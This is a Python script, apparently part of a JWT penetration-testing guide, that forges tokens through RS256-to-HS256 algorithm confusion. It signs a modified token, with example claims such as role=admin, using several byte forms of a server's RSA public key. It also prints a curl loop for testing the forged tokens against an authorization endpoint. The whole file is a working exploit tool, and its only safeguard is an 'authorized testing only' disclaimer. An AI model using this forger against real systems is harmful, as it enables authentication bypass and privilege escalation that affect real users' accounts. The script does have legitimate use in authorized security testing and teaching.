#!/usr/bin/env python3
"""
rs256_to_hs256.py — RS256 -> HS256 algorithm-confusion forger (guide §8/§9).

Idea: a vulnerable verifier picks the KEY from its own config (the RSA public key) but the
ALGORITHM from the token. If you set alg=HS256, it computes HMAC(publicKey, data) — and since
the public key is public, so can you. The usual snag is the EXACT byte representation of the
key the server uses (PEM vs DER, with/without trailing newline, PKCS#1 vs SubjectPublicKeyInfo).
This script emits one candidate token PER representation so you can try them all.

Input: the RSA PUBLIC key (PEM). Get it from the JWKS (/.well-known/jwks.json), the TLS cert,
or recover it from two tokens with silentsignal/rsa_sign2n (guide §9).

AUTHORIZED TESTING ONLY. Forge into your own test account; never impersonate a real user.

Requires: pip install cryptography
Example:
  python3 rs256_to_hs256.py <TOKEN> --pubkey public.pem --claim role=admin --claim sub=1337
"""
import argparse
import sys
from jwt_common import decode_token, build_token, apply_claims

try:
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.serialization import load_pem_public_key
except ImportError:
    print("[!] pip install cryptography", file=sys.stderr)
    sys.exit(1)


def key_representations(pem_bytes: bytes):
    """Return a dict {label: secret_bytes} of the public key in formats servers commonly use."""
    reps = {}
    # Raw file bytes exactly as provided (most common = what the server reads from disk/JWKS->PEM)
    reps["pem_file_asis"] = pem_bytes
    reps["pem_file_stripped"] = pem_bytes.rstrip(b"\n")
    reps["pem_file_nl"] = pem_bytes.rstrip(b"\n") + b"\n"

    try:
        pub = load_pem_public_key(pem_bytes)
    except Exception as e:
        print(f"[!] Could not parse PEM ({e}); only file-byte variants will be tried.", file=sys.stderr)
        return reps

    # Re-serialized canonical forms
    spki_pem = pub.public_bytes(serialization.Encoding.PEM,
                                serialization.PublicFormat.SubjectPublicKeyInfo)
    reps["spki_pem"] = spki_pem
    reps["spki_pem_stripped"] = spki_pem.rstrip(b"\n")
    spki_der = pub.public_bytes(serialization.Encoding.DER,
                                serialization.PublicFormat.SubjectPublicKeyInfo)
    reps["spki_der"] = spki_der
    try:
        pkcs1_pem = pub.public_bytes(serialization.Encoding.PEM,
                                     serialization.PublicFormat.PKCS1)
        reps["pkcs1_pem"] = pkcs1_pem
        reps["pkcs1_pem_stripped"] = pkcs1_pem.rstrip(b"\n")
    except Exception:
        pass
    return reps


def main():
    ap = argparse.ArgumentParser(description="RS256->HS256 confusion forger (tries key-format variants).")
    ap.add_argument("token")
    ap.add_argument("--pubkey", required=True, help="path to the RSA public key PEM")
    ap.add_argument("--alg", default="HS256", help="HS256/HS384/HS512 (default HS256)")
    ap.add_argument("--claim", action="append", default=[], help="key=value (repeatable)")
    args = ap.parse_args()

    with open(args.pubkey, "rb") as f:
        pem = f.read()

    header, payload, _ = decode_token(args.token)
    header["alg"] = args.alg
    payload = apply_claims(payload, args.claim)

    reps = key_representations(pem)
    print(f"[i] Emitting {len(reps)} candidate tokens (one per key representation).")
    print("[i] Try each against an authz endpoint; the one that is ACCEPTED reveals the server's key bytes.\n")

    for label, secret in reps.items():
        token = build_token(dict(header), payload, secret=secret, alg=args.alg)
        print(f"--- {label} ---")
        print(token)
        print()

    print("[i] Bulk test (bash):")
    print('    for t in <paste tokens>; do echo -n "$t -> "; '
          'curl -s -o /dev/null -w "%{http_code}\\n" "$URL" -H "Authorization: Bearer $t"; done')


if __name__ == "__main__":
    main()
